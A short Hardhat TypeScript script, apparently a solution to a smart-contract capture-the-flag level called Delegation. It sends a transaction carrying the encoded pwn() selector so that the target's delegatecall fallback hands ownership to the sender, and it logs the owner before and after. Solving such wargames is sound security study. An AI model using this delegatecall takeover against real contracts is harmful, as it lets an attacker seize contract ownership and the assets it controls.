import { ethers } from "hardhat";
import { Address } from "hardhat-deploy/types";
import { Delegate } from "../typechain-types";

const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

const main = async () => {
    const [deployer] = await ethers.getSigners();
    const delegationAddress: Address = "0xEbe31621C2eF3FC0d0BcBD64C4fd7a0799D641A3";
    const delegation: Delegate = await ethers.getContractAt("Delegation", delegationAddress, deployer);

    let ABI = ["function pwn()"];
    let iFace = new ethers.utils.Interface(ABI);
    const data = iFace.encodeFunctionData("pwn",[]);
    console.log(`📞 Previous owner: ${await delegation.owner()}`);
    await deployer.sendTransaction({
        to: delegationAddress,
        data: data,
        gasLimit: 21000000
    });
    await delay(10000);
    console.log(`📲 New owner: ${await delegation.owner()}`);
}

main().catch(error => {
  console.error('🚫', error);
});
